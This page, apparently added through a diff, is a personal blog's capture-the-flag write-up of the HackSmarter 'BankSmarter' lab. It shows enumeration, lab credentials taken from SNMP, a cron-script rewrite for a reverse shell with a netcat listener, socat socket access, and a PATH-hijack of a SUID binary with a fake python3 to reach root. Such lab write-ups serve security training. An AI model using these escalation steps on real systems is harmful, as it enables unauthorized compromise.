@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LumiryX - BankSmarter</title>
+<link rel="stylesheet" href="/style/main.css">
+</head>
+
+<body>
+<header>
+<div class="favicon">
+    <a href="/index.html"><img src="/img/favicon.ico" alt="Imagine" target="_blank"></a>
+</div>
+<h1 class="page-title">LumiryX - BankSmarter</h1>
+<div class="header-controls">
+<button onclick="toggleTheme()">🌙</button>
+</div>
+</header>
+<div class="layout">
+<!-- LEFT SIDEBAR -->
+<aside class="sidebar-left">
+<h2>Content</h2>
+<hr>
+<div class="extra-padding">
+<div class="section">
+  <div class="section-title">Tools</div>
+    <div class="section-content">
+        <a href="#">GuessSmarter</a>
+        </div>
+    </div>
+<div class="section">
+  <div class="section-title">Projects</div>
+    <div class="section-content">
+        <a href="#">NAS server</a>
+        </div>
+    </div>
+<div class="section">
+  <div class="section-title">Writeups</div>
+      <div class="section-content">
+        <div class="section">
+            <div class="section-title">TryHackMe</div>
+                <div class="section-content">
+                    <a href="/content/Writeups/TryHackMe/Brooklyn99.html" target="_blank">Brooklyn99</a>
+                    <a href="/content/Writeups/TryHackMe/Poster.html" target="_blank">Poster</a>
+                </div>
+            </div>
+                <div class="section">
+            <div class="section-title">HackSmarter</div>
+                <div class="section-content">
+                    <a href="/content/Writeups/HackSmarter/Ascension.html">Ascension</a>
+                    <a href="/content/Writeups/HackSmarter/SilverPlatter.html">SilverPlatter</a>
+                    <a href="/content/Writeups/HackSmarter/BankSmarter.html">BankSmarter</a>
+                </div>
+            </div>
+    </div>
+</div>
+</aside>
+<!-- MAIN CONTENT -->
+<main class="main-content">
+
+
+    <p>This CTF challenge is from <a href="https://www.hacksmarter.org">HackSmarter Webpage</a></p>
+<h1 id="mission-scenario">Mission Scenario</h1>
+<p>You are a senior operator on the Hack Smarter Red Team, tasked with a penetration test against a standalone Linux server. Your objective is to gain initial access and escalate privileges to root, emulating a worst-case scenario where a threat actor successfully compromises a critical asset.</p>
+<p>You have been given the IP address of the target server and your mission is to gain a foothold, escalate to the <strong>root</strong> user, and retrieve the final flag from the <code>/root/</code> directory.</p>
+<h3 id="have-to-obtain-">Have to obtain:</h3>
+<ul>
+<li>User Flag</li>
+<li>Root Flag</li>
+</ul>
+<h2 id="setup">Setup</h2>
+<p>You can connect to this lab by downloading the VPN under the &quot;Systems&quot; tab or using the Browser-Based Kali Virtual Machine.</p>
+<p>Then start a VPN with <code>openvpn</code> command:</p>
+<pre><code>~<span class="hljs-regexp">/Documents/</span>HSMvpn &gt; sudo openvpn challenge_lab_banksm.ovpn
+</code></pre><p>Add Target IP to the <code>/etc/hosts</code></p>
+<pre><code>10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.29</span><span class="hljs-selector-class">.155</span>     <span class="hljs-selector-tag">banksmarter</span><span class="hljs-selector-class">.hsm</span>
+</code></pre><h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<p>TCP</p>
+<pre><code>~ &gt; <span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">-p-</span> <span class="hljs-selector-tag">banksmarter</span><span class="hljs-selector-class">.hsm</span> <span class="hljs-selector-tag">-T5</span>
+
+<span class="hljs-selector-tag">PORT</span>   <span class="hljs-selector-tag">STATE</span> <span class="hljs-selector-tag">SERVICE</span> <span class="hljs-selector-tag">VERSION</span>
+<span class="hljs-selector-tag">22</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">ssh</span>     <span class="hljs-selector-tag">OpenSSH</span> <span class="hljs-selector-tag">9</span><span class="hljs-selector-class">.6p1</span> <span class="hljs-selector-tag">Ubuntu</span> <span class="hljs-selector-tag">3ubuntu13</span><span class="hljs-selector-class">.14</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-selector-tag">ssh-hostkey</span>: 
+|   <span class="hljs-selector-tag">256</span> <span class="hljs-selector-tag">41</span><span class="hljs-selector-pseudo">:c0</span><span class="hljs-selector-pseudo">:49</span><span class="hljs-selector-pseudo">:e8</span><span class="hljs-selector-pseudo">:ae</span><span class="hljs-selector-pseudo">:cf</span><span class="hljs-selector-pseudo">:b4</span><span class="hljs-selector-pseudo">:68</span><span class="hljs-selector-pseudo">:6a</span><span class="hljs-selector-pseudo">:a2</span><span class="hljs-selector-pseudo">:be</span><span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-pseudo">:e8</span><span class="hljs-selector-pseudo">:40</span><span class="hljs-selector-pseudo">:9f</span><span class="hljs-selector-pseudo">:90</span> (ECDSA)
+|<span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">256</span> <span class="hljs-selector-tag">e6</span><span class="hljs-selector-pseudo">:43</span><span class="hljs-selector-pseudo">:94</span><span class="hljs-selector-pseudo">:f2</span><span class="hljs-selector-pseudo">:af</span><span class="hljs-selector-pseudo">:1f</span><span class="hljs-selector-pseudo">:12</span><span class="hljs-selector-pseudo">:57</span><span class="hljs-selector-pseudo">:3b</span><span class="hljs-selector-pseudo">:ea</span><span class="hljs-selector-pseudo">:c5</span><span class="hljs-selector-pseudo">:4a</span><span class="hljs-selector-pseudo">:f7</span><span class="hljs-selector-pseudo">:1b</span><span class="hljs-selector-pseudo">:fc</span><span class="hljs-selector-pseudo">:ca</span> (ED25519)
+<span class="hljs-selector-tag">Service</span> <span class="hljs-selector-tag">Info</span>: <span class="hljs-selector-tag">OS</span>: <span class="hljs-selector-tag">Linux</span>; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel
+</code></pre><ul>
+<li>Port 22 Open</li>
+</ul>
+<p>UDP</p>
+<pre><code>&gt; sudo nmap -sU -sV --top-ports <span class="hljs-number">100</span> banksmarter.hsm -T5
+
+PORT      STATE  SERVICE        VERSION
+<span class="hljs-number">69</span>/udp    closed tftp
+<span class="hljs-number">138</span>/udp   closed netbios-dgm
+<span class="hljs-number">161</span>/udp   open   snmp           net-snmp; net-snmp SNMPv3 server
+<span class="hljs-number">999</span>/udp   closed applix
+<span class="hljs-number">1027</span>/udp  closed unknown
+<span class="hljs-number">1029</span>/udp  closed solid-mux
+<span class="hljs-number">1701</span>/udp  closed L2TP
+<span class="hljs-number">1813</span>/udp  closed radacct
+<span class="hljs-number">4500</span>/udp  closed nat-t-ike
+<span class="hljs-number">32771</span>/udp closed sometimes-rpc6
+<span class="hljs-number">49182</span>/udp closed unknown
+<span class="hljs-number">49186</span>/udp closed unknown
+<span class="hljs-number">49190</span>/udp closed unknown
+</code></pre><ul>
+<li>Port 161 Open</li>
+</ul>
+<h2 id="ssh-22-">SSH (22)</h2>
+<p>Password Authentication is enable.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/SSH first login.png"></div></p>
+<h2 id="snmpwalk-161-">SNMPWALK (161)</h2>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/SNMPWALK.png"></div></p>
+<p>We get someone credentials: <code>Layne.Stanley : 5t6^jahTRjab</code></p>
+<h1 id="vulnerability-assessment">Vulnerability Assessment</h1>
+<h2 id="ssh-login-22-">SSH Login (22)</h2>
+<p>In enumeration phase we obtain someone credentials. Now we have to figure out where it goes. If it is a rabbit hole or these are the valid credentials.</p>
+<p>Valid Credentials are:</p>
+<ul>
+<li>Name: <code>layne.stanley</code></li>
+<li>Password: <code>5t6^jahTRjab</code></li>
+</ul>
+<p><code>~ &gt; ssh Layne.Stanley@banksmarter.hsm</code>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/SSH first login.png"></div></p>
+<p>Now we are Log in as <code>layne.stanley</code>. </p>
+<h2 id="post-exploitation-layne-stanley-">Post-Exploitation (layne.stanley)</h2>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/SSH first login.png"></div></p>
+<p>BankSmarter file is in home directory but with another user:
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/First login over SSH.png"></div></p>
+<p>Also as we see we have inside home directory file with name <code>user.txt</code> which is the flag what we are looking for. </p>
+<pre><code>layne.stanley@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>:~$ cat user.txt 
+R29vZCBKb2IgRW51bWVyYXRpbmdscyAtbGEhIEtlZXAg*******
+</code></pre><p>Also we founded bank file inside <code>/opt</code> Directory:
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Bank file.png"></div></p>
+But we dont have permissions to open it.</p>
+<h3 id="banksmarter_backup-sh">bankSmarter_backup.sh</h3>
+<p>There is some backups data need to be check:</p>
+<pre><code><span class="hljs-attr">EXPORT_DIR</span>=<span class="hljs-string">"/tmp/bank_exports"</span>
+
+<span class="hljs-attr">REPORT_FILE</span>=<span class="hljs-string">"${EXPORT_DIR}/customer_export_$(date +%F_%H%M%S).csv"</span>
+
+<span class="hljs-attr">API_KEYS_DIR</span>=<span class="hljs-string">"/etc/bank_api_keys"</span>
+
+<span class="hljs-attr">SAMPLE_API_KEY_FILE</span>=<span class="hljs-string">"${API_KEYS_DIR}/transactions_api.key"</span>
+</code></pre><h3 id="multiple-users-on-this-machine-">Multiple Users on this machine:</h3>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Multiple Users.png"></div></p>
+<ul>
+<li>root</li>
+<li>ubuntu</li>
+<li>scott.weiland</li>
+<li>ronnie.stone</li>
+</ul>
+<h3 id="where-are-we-and-what-we-can-do-">Where are we and what we can do:</h3>
+<p>As we know a password for our user <code>layne.stanley</code> we can check which permissions we have on this machine.</p>
+<pre><code>layne.stanley@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>:~$ sudo -l
+[sudo] password for layne.stanley: 
+Sorry, user layne.stanley may not run sudo on ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>.
+</code></pre><p>Also we can check in which group of users we are:</p>
+<pre><code>layne.stanley@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>:~$ id
+uid=1001(layne.stanley) gid=1001(layne.stanley) groups=1001(layne.stanley)
+</code></pre><ul>
+<li>We cant run sudo and we are not in any group of users.</li>
+</ul>
+<h1 id="privilege-escalation-layne-stanley-scott-weiland-">Privilege Escalation (layne.stanley -&gt; scott.weiland)</h1>
+<h3 id="pspy">Pspy</h3>
+<p>We have to download it to the machine. </p>
+<ol>
+<li>Download it to your Linux machine. <a href="https://github.com/DominicBreuker/pspy">Here</a></li>
+<li>Run a server on your Linux machine: <code>python3 -m http.server</code></li>
+<li>On the target machine run this command: <code>wget http://[your IP tun0]/[name of the pspy file]</code></li>
+<li>Add the permissions to run a file <code>chmod +x pspy64</code></li>
+<li>If it was successful shut down python3 server and run a tool on the on the target machine from the target machine.</li>
+</ol>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Pspy copy.png"></div></p>
+<p>Run tool: 
+<code>./pspy64</code></p>
+<p>There is a cronjob running the backup script
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Cronjob running.png"></div></p>
+More info about <a href="https://github.com/DominicBreuker/pspy">Pspy</a> If you like to know more about this tool.</p>
+<p>UID=1002 have user with name: <code>scott.weiland</code> 
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/scott.weiland UID.png"></div></p>
+<p>We are not able to write into file but we are able to rename it &quot;bankSmarter_backup.sh&quot; which the scott is running over stanley user and when we rename it then we can write our own code.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Rewriting backup file.png"></div></p>
+<p>Write this payload into <code>bankSmarter_backup.sh</code>:
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Rewriting backup file script.png"></div></p>
+<p>We have to setup lisener on our main Linux machine. </p>
+<pre><code>nc -lvnp <span class="hljs-number">4444</span>
+</code></pre><p>Now we just have to wait for the file automatic execution which grant us Remote Shell for user <code>scott.weiland</code></p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/PoC scott.weiland.png"></div></p>
+<h1 id="lateral-movement-scott-weiland-">Lateral Movement (scott.weiland)</h1>
+<p>We was able to obtain unstable shell. For make it stable we have a multiple techniques. One of them is generate ssh-key and log in via SSH. </p>
+<p>Generating SSH key:</p>
+<pre><code><span class="hljs-quote">&gt; ssh-keygen</span>
+</code></pre>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Generating SSH keys.png"></div></p>
+<p>Now we have to copy our SSH key into scott.weiland machine.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Copy SSH keys.png"></div></p>
+<p>Now we should be able to log in the machine over SSH with the ssh key.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Log in over SSH scott.png"></div></p>
+<h3 id="enumeration-scott-weiland-">Enumeration (scott.weiland)</h3>
+<p> ID</p>
+<pre><code>scott.weiland@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>:~$ id
+uid=1002(scott.weiland) gid=1002(scott.weiland) groups=1002(scott.weiland),1003(ronnie.stone),1005(tmuxshare),1006(tmuxusers),1007(tmuxshared),1008(bank-team)
+</code></pre><ul>
+<li>bank-team</li>
+<li>various tmux groups</li>
+<li>roonie.stone</li>
+</ul>
+<p>Now we should be able to look at the <code>bank</code> directory which we founded earlier.</p>
+<pre><code>scott.weiland@ip-10-1-108-131:/opt/bank$ ls -la                                 
+total<span class="hljs-number"> 24 </span>                                                                       
+drwxr-x---<span class="hljs-number"> 4 </span>root         bank-team   <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 12 </span>19:15 .                      
+drwxr-xr-x<span class="hljs-number"> 3 </span>root         root        <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 12 </span>18:51 ..                     
+drwxr-xr-x<span class="hljs-number"> 2 </span>root         root        <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 12 </span>19:15 logs                   
+-rwxr-x---<span class="hljs-number"> 1 </span>ronnie.stone bank-team   <span class="hljs-number"> 1369 </span>Sep<span class="hljs-number"> 12 </span>19:04 pty_server.py          
+drwxrws---<span class="hljs-number"> 2 </span>ronnie.stone bank-team   <span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 29 </span>11:18 sockets                
+-rwxr-xr-x<span class="hljs-number"> 1 </span>ronnie.stone ronnie.stone<span class="hljs-number"> 1668 </span>Sep<span class="hljs-number"> 12 </span>18:54 start_ronnie_tmux.sh   
+scott.weiland@ip-10-1-108-131:/opt/bank$
+</code></pre><p>We can rewrite start_ronnie_tmux.sh but we are unable to run it</p>
+<h5 id="looking-at-bash_history">Looking at .bash_history</h5>
+<pre><code>cd ~/Downloads          - Nothing
+git status              - Nothing
+vim notes<span class="hljs-selector-class">.txt</span>           - Nothing
+
+socat stdio unix-connect:/opt/bank/sockets/live<span class="hljs-selector-class">.sock</span>.   
+
+docker ps -<span class="hljs-selector-tag">a</span>           - Nothing
+</code></pre><h2 id="privilege-escalation-scott-weiland-ronnie-stone-">Privilege Escalation (scott.weiland -&gt; ronnie.stone)</h2>
+<p>This command grant a roonie access for us.
+<code>socat stdio unix-connect:/opt/bank/sockets/live.sock.</code> 
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/socat privilege escalation scott.png"></div></p>
+<h4 id="stabilizing-shell-">STABILIZING SHELL:</h4>
+<p>We have again access to .ssh file so we should be able to copy our ssh key in the .ssh directory but its not working. So I decide to use other technique to obtain ronnie access.</p>
+<p>I like to use Google Browser Extension: <code>HACK TOOLS</code> for payloads</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Hack-tools extension.png"></div></p>
+<p>Inside roonie.stone terminal type:</p>
+<ol>
+<li><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li>
+<li><code>export TERM=xterm</code></li>
+<li><code>Ctrl + Z</code></li>
+<li><code>stty raw -echo; fg</code></li>
+<li><code>stty rows 38 columns 116</code>
+</li>
+</ol>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Stabilizing shell ronnie.png"></div></p>
+<p>Now when we have stable shell we can start making enumeration.</p>
+<h2 id="enumeration-ronnie-stone-">Enumeration (ronnie.stone)</h2>
+<pre><code>ronnie.stone<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-<span class="hljs-number">108</span>-<span class="hljs-number">131</span><span class="hljs-symbol">:~/</span>.ssh<span class="hljs-variable">$ </span>id
+id
+uid=<span class="hljs-number">1003</span>(ronnie.stone) gid=<span class="hljs-number">1008</span>(bank-team) groups=<span class="hljs-number">1008</span>(bank-team),<span class="hljs-number">1004</span>(bankers),<span class="hljs-number">1005</span>(tmuxshare),<span class="hljs-number">1006</span>(tmuxusers),<span class="hljs-number">1007</span>(tmuxshared)
+</code></pre><ul>
+<li>bankers</li>
+</ul>
+<h1 id="privilege-escalation-ronnie-stone-root-">Privilege Escalation (ronnie.stone -&gt; root)</h1>
+<p>When we know we are in the bankers group we can check if we have some file for this group in <code>roonie.stone</code> account:</p>
+<pre><code>ronnie.stone<span class="hljs-meta">@ip</span><span class="hljs-number">-10</span><span class="hljs-number">-1</span><span class="hljs-number">-108</span><span class="hljs-number">-131</span>:~$ find <span class="hljs-regexp">/ -group bankers 2&gt;/</span>dev/<span class="hljs-literal">null</span>
+<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>bank_backupd
+</code></pre><p>We have a binary in the bankers group so lets enumerate it, and try to escalate our privileges with this clue.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Privilege Escalation ronnie to root.png"></div></p>
+That &quot;s&quot; signals The SUID (Set User ID) bit is set, making the binary run as its owner.</p>
+<p>When we run <code>bank_backupd</code> we get this response:</p>
+<pre><code>ronnie.stone@ip<span class="hljs-number">-10</span><span class="hljs-number">-0</span><span class="hljs-number">-29</span><span class="hljs-number">-155</span>:/usr/local/bin$ ./bank_backupd
+[bank_backupd] <span class="hljs-symbol">Starting</span> backup for <span class="hljs-symbol">BankSmarter</span> accounts...
+[bank_backupd] <span class="hljs-symbol">Connecting</span> to central ledger...
+[bank_backupd] <span class="hljs-symbol">Verifying</span> transaction logs...
+[bank_backup.py] <span class="hljs-symbol">Running</span> internal <span class="hljs-symbol">Python</span> verification...
+[bank_backup.py] <span class="hljs-symbol">Hashing</span> account transactions...
+<span class="hljs-number">86</span>d9050926fde112924e2f71ea8d17b88d90068f39c9907bb3932c2df3c46dfc
+[bank_backup.py] <span class="hljs-symbol">Backup</span> completed successfully.
+</code></pre><p>File runs <code>bank_backup.py</code></p>
+<p>Lets take a look at the <code>bank_backup.py</code>:</p>
+<pre><code>ronnie.stone<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">29</span>-<span class="hljs-number">155</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-variable">$ </span>cat bank_backup.py
+<span class="hljs-comment">#!/usr/bin/env python3</span>
+import hashlib, time, os
+
+print(<span class="hljs-string">"[bank_backup.py] Running internal Python verification..."</span>)
+time.sleep(<span class="hljs-number">1</span>)
+print(<span class="hljs-string">"[bank_backup.py] Hashing account transactions..."</span>)
+
+<span class="hljs-comment"># Fake hash calculation</span>
+
+print(hashlib.sha256(b<span class="hljs-string">"transaction data"</span>).hexdigest())
+print(<span class="hljs-string">"[bank_backup.py] Backup completed successfully."</span>)
+</code></pre><p>This seems to be just a some random script if we can overwrite it we should be able to gain higher privileges. Since this is executes as root program.</p>
+<h4 id="python-path-hijacking">Python Path Hijacking</h4>
+<p>We are unable to overwrite the script but this executes python3 from the env directory which we can hijack and executes malicious python3 binary.</p>
+<pre><code>#!/usr/bin/env python3 <span class="hljs-keyword">import</span> hashlib, time, os print(<span class="hljs-string">"[bank_backup.py] Running internal Python verification..."</span>) time.sleep(<span class="hljs-number">1</span>) # ... (rest <span class="hljs-keyword">of</span> the script)
+</code></pre><ul>
+<li>Note it is accepting the python3 directly from the environment when the script runs</li>
+<li>We can hijack the path, by specifying the env with a malicious python3 binary</li>
+</ul>
+<p>Inside <code>/tmp</code> directory we have to write this command into <code>python3</code> and the script should potentially executes our script instead:</p>
+<pre><code>ronnie.stone<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">29</span>-<span class="hljs-number">155</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>echo -e <span class="hljs-string">'#!/bin/bash\n/bin/bash -p'</span> &gt; python3
+</code></pre><p>Also we have to make it executable:
+<code>chmod +x python3</code></p>
+<p>And we must to change a path for <code>/tmp</code>:</p>
+<pre><code>ronnie.stone<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">29</span>-<span class="hljs-number">155</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>PATH=<span class="hljs-regexp">/tmp:$PATH /usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-regexp">/bank_backupd</span>
+</code></pre><p>After changing the path we obtained root access.</p>
+<pre><code>ronnie.stone@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>:/tmp$ PATH=/tmp:$PATH /usr/local/bin/bank_backupd
+[bank_backupd] Starting backup for BankSmarter accounts...
+[bank_backupd] Connecting to central ledger...
+[bank_backupd] Verifying transaction logs...
+root@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><span class="hljs-string">-29</span><span class="hljs-string">-155</span>:/tmp#
+</code></pre><p>As they told us the last flag is in the <code>/root</code> directory so lets change directory to the root and read the flag:</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Root Flag.png"></div></p>
+<p>When you obtain this root flag try to decode this b64 encryption ;)</p>
+<h1 id="note-">Note:</h1>
+<p>Big shout-out to Tyler Ramsbey who builded HackSmarter and also huge thanks to author of this room:  <a href="https://www.linkedin.com/in/ryan-yager-442a4964/">Ryan Yager</a>.</p>
+<p>Ps: If you get stuck try to find a solution by yourself. It gonna improve your skill rapidly. Even when it takes lot of time it is worth to struggle.</p>
+
+
+</main>
+
+<!-- RIGHT SIDEBAR -->
+<aside class="sidebar-right">
+<div class="social-box">
+<h4>Social</h4>
+<a href="https://github.com/LumiryX" target="_blank">GitHub</a>
+<a href="https://discordapp.com/users/340045438990286850" target="_blank">Discord</a>
+<a href="https://www.youtube.com/@LumiryX-SecureShield" target="_blank">YouTube</a>
+</div>
+</aside>
+</div>
+<footer>
+
+© 2026 LumiryX 
+
+</footer>
+<script src="/js/script.js"></script>
+
+</body>
+</html>
